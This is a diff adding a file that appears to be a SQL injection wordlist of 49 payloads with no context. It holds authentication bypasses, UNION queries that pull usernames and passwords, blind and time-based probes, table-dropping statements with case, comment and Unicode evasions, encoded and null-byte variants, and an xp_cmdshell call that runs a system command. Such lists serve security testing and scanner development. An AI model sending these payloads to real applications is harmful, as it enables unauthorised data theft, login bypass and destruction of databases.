@@ -1,0 +1,49 @@
+' OR '1' = '1
+' OR '1' = '1' -- 
+' OR '1' = '1' # 
+'; DROP TABLE users; --
+' UNION SELECT 1,2,3 --
+' AND 1=0 UNION ALL SELECT 1,2,username+':'+password FROM users --
+' OR 1=1 --
+' OR 'x' = 'x
+' OR 'text' = 't'||'ext
+' OR 'xyz' = 'xy'+'z'
+' AND 1=1 --
+' AND 1=2 --
+' AND (SELECT 1 FROM users WHERE username='admin')=1 --
+' AND SUBSTR((SELECT username FROM users LIMIT 1),1,1)='a' --
+' OR IF(1=1, SLEEP(5), 0) --
+' OR IF((SELECT username FROM users WHERE username='admin')='admin', SLEEP(5), 0) --
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT 1,2,3 FROM users WHERE username='admin' --
+'; EXEC xp_cmdshell('nslookup example.com') --
+' OR 1=1; -- 
+' OR 'a'='a
+'') OR '1'='1' --
+' OR 1 -- 
+' OR 'a' = 'a'; --
+'; DROP/*comment*/TABLE users; --
+' OR ASCII(SUBSTR(username,1,1)) = 97 --
+'; dRoP TaBle users; --
+' AND mID(username,1,1) = 'a' --
+'; DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't'; --
+0 OR 1=1
+-1' OR 1=1 --
+' OR 1=0x01 --
+' OR x=0x796573 --
+%2527%2520OR%25201%25253D1%2520%2523
+' OR 1=1%00
+' OR 'x' = 'x'%00
+'; DRÖP TABLE users; --   (Using non-standard characters)
+' AND (SELECT COUNT(*) FROM users WHERE SESSION_USER()='admin')=1 --
+' HAVING 1=1 AND IF(ASCII(SUBSTR((SELECT password FROM users WHERE username='admin' LIMIT 1),1,1))=97,1,CAST('a' AS INT)) --
+' GROUP BY table.column FROM table HAVING 1=1 --
+' OR 1 & (SELECT 1 FROM users LIMIT 1)=1 --
+' OR @@version=5 --
+' UNION SELECT NULL,NULL,NULL,NULL --
+' UNION ALL SELECT NULL, NULL, NULL, (SELECT OID FROM PG_LARGEOBJECT WHERE LOMANAGER=1974) --
+'; procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT user FROM mysql.user LIMIT 1))),1); --
+' WHEN 1 THEN 'a' ELSE 'b' END --
+'; WITH XMLNAMESPACES ('http://schemas.xmlsoap.org/soap/envelope/' AS ns) SELECT name FROM sys.tables FOR XML PATH(''), TYPE --
+'; SELECT BENCHMARK(1000000,MD5('test')) --
+'); ATTACH DATABASE 'memory:' AS mydb; --
